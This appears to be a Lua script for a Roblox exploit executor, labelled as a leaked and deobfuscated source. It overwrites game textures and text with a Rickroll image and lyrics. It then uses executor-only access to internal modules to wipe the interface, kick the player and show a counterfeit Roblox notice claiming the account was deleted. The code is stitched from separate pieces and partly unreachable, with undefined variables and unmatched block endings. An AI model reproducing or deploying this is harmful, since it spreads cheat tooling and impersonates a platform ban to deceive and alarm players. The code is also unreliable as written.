--allah source leak deobfuscated 😱
        local imageAssetId = "rbxassetid://8423195710"
        
        local function replaceTextureId(screenGui)
            for _, frame in ipairs(screenGui:GetDescendants()) do
                if frame:IsA("ImageLabel") or frame:IsA("ImageButton") then
                    frame.Image = imageAssetId
                end
            end
        end
        
        local function getTextGUIs()
            local textGUIs = {}
            for _, instance in ipairs(game:GetDescendants()) do
                if instance:IsA("TextLabel") or instance:IsA("TextBox") then
                    table.insert(textGUIs, instance)
                end
            end
            return textGUIs
        end
        
        local function trollageTextGUIs()
            local textGUIs = getTextGUIs()
            for _, textGUI in ipairs(textGUIs) do
                textGUI.Text = "Never Gonna Give You Up"
            end
        end
        
        while true do
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
                    v.Image = imageAssetId
                    v:GetPropertyChangedSignal("Image"):Connect(function()
                        v.Image = imageAssetId
                    end)
                end
                
                if (v:IsA("TextLabel") or v:IsA("TextButton")) and not v:GetFullName():find("ChatChannelParentFrame") then
                    if v.Text ~= "" then
                        v.Text = "Never Gonna Give You Up"
                    end
                    v:GetPropertyChangedSignal("Text"):Connect(function()
                        if v.Text ~= "" then
                            v.Text = "Never Gonna Let You Down"
                        end
                    end)
                end
                
                if v:IsA("Texture") or v:IsA("Decal") then
                    v.Texture = imageAssetId
                    v:GetPropertyChangedSignal("Texture"):Connect(function()
                        v.Texture = imageAssetId
                    end)
                end
                
                if v:IsA("MeshPart") then
                    v.TextureID = imageAssetId
                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
                        v.TextureID = imageAssetId
                    end)
                end
                
                if v:IsA("SpecialMesh") then
                    v.TextureId = imageAssetId
                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
                        v.TextureId = imageAssetId
                    end)
                end
            end
            
            game.Lighting.Sky.SkyboxBk = imageAssetId
            game.Lighting.Sky.SkyboxDn = imageAssetId
            game.Lighting.Sky.SkyboxFt = imageAssetId
            game.Lighting.Sky.SkyboxLf = imageAssetId
            game.Lighting.Sky.SkyboxRt = imageAssetId
            game.Lighting.Sky.SkyboxUp = imageAssetId
            
            for _, screenGui in ipairs(game:GetDescendants()) do
                if screenGui:IsA("ScreenGui") then
                    replaceTextureId(screenGui)
                end
            end
            
            trollageTextGUIs()
            
            wait(0.5)
        end
				setfpscap(9e9)
				print(game:GetObjects("h29g3535")[1])
          local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					lplr.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
			end
